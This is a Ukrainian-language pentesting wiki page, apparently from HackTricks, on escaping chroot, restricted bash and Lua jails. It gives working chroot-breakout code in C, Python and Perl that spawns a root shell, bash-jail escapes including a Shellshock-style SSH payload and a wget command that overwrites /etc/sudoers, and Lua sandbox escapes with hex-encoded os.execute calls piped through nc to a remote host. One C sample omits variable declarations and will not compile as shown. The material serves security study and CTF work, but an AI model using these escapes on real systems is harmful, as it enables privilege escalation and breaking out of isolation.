# Втеча з в'язниць

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Шукайте в** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **чи можете виконати будь-який бінар з властивістю "Shell"**

## Втечі з Chroot

З [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Механізм chroot **не призначений для захисту** від навмисного втручання **привілейованих** (**root**) **користувачів**. На більшості систем контексти chroot не налаштовуються належним чином, і програми, що знаходяться в chroot, **з достатніми привілеями можуть виконати другий chroot для втечі**.\
Зазвичай це означає, що для втечі вам потрібно бути root всередині chroot.

> [!TIP]
> **Інструмент** [**chw00t**](https://github.com/earthquake/chw00t) був створений для зловживання наступними сценаріями та втечі з `chroot`.

### Root + CWD

> [!WARNING]
> Якщо ви **root** всередині chroot, ви **можете втекти**, створивши **інший chroot**. Це тому, що 2 chroot не можуть співіснувати (в Linux), тому якщо ви створите папку, а потім **створите новий chroot** в цій новій папці, будучи **зовні її**, ви тепер будете **зовні нового chroot** і, отже, будете в FS.
>
> Це відбувається тому, що зазвичай chroot НЕ переміщує ваш робочий каталог до вказаного, тому ви можете створити chroot, але бути зовні його.

Зазвичай ви не знайдете бінарний файл `chroot` всередині в'язниці chroot, але ви **можете скомпілювати, завантажити та виконати** бінарний файл:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Це подібно до попереднього випадку, але в цьому випадку **зловмисник зберігає дескриптор файлу для поточної директорії** і потім **створює chroot у новій папці**. Нарешті, оскільки він має **доступ** до цього **FD** **зовні** chroot, він отримує до нього доступ і **втікає**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD може бути передано через Unix Domain Sockets, тому:
>
> - Створіть дочірній процес (fork)
> - Створіть UDS, щоб батьківський і дочірній процеси могли спілкуватися
> - Запустіть chroot у дочірньому процесі в іншій папці
> - У батьківському процесі створіть FD папки, яка знаходиться поза новим chroot дочірнього процесу
> - Передайте дочірньому процесу цей FD за допомогою UDS
> - Дочірній процес змінює директорію на цей FD, і оскільки він знаходиться поза своїм chroot, він втече з в'язниці

### Root + Mount

> [!WARNING]
>
> - Монтування кореневого пристрою (/) у директорію всередині chroot
> - Chroot у цю директорію
>
> Це можливо в Linux

### Root + /proc

> [!WARNING]
>
> - Замонтуйте procfs у директорію всередині chroot (якщо ще не замонтовано)
> - Шукайте pid, який має інший запис root/cwd, наприклад: /proc/1/root
> - Chroot у цей запис

### Root(?) + Fork

> [!WARNING]
>
> - Створіть Fork (дочірній процес) і chroot у іншу папку глибше в FS і CD на неї
> - З батьківського процесу перемістіть папку, в якій знаходиться дочірній процес, у папку перед chroot дочірніх процесів
> - Цей дочірній процес виявить себе поза chroot

### ptrace

> [!WARNING]
>
> - Колись користувачі могли налагоджувати свої власні процеси з процесу самого себе... але це більше не можливо за замовчуванням
> - У будь-якому випадку, якщо це можливо, ви могли б ptrace у процес і виконати shellcode всередині нього ([дивіться цей приклад](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Отримайте інформацію про в'язницю:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Змінити PATH

Перевірте, чи можете ви змінити змінну середовища PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Використання vim
```bash
:set shell=/bin/sh
:shell
```
### Створити скрипт

Перевірте, чи можете ви створити виконуваний файл з _/bin/bash_ як вмістом
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Отримати bash через SSH

Якщо ви отримуєте доступ через ssh, ви можете використати цей трюк для виконання оболонки bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Оголосити
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Ви можете перезаписати, наприклад, файл sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Інші трюки

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
**Також може бути цікавою сторінка:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Трюки щодо втечі з python jails на наступній сторінці:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

На цій сторінці ви можете знайти глобальні функції, до яких у вас є доступ всередині lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval з виконанням команд:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Декілька трюків, щоб **викликати функції бібліотеки без використання крапок**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Перерахуйте функції бібліотеки:
```bash
for k,v in pairs(string) do print(k,v) end
```
Зверніть увагу, що щоразу, коли ви виконуєте попередній однолінійний код в **іншому середовищі lua, порядок функцій змінюється**. Тому, якщо вам потрібно виконати одну конкретну функцію, ви можете виконати грубу силу, завантажуючи різні середовища lua та викликаючи першу функцію бібліотеки:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Отримати інтерактивну lua оболонку**: Якщо ви знаходитесь всередині обмеженої lua оболонки, ви можете отримати нову lua оболонку (і, сподіваємось, без обмежень), викликавши:
```bash
debug.debug()
```
## Посилання

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Слайди: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
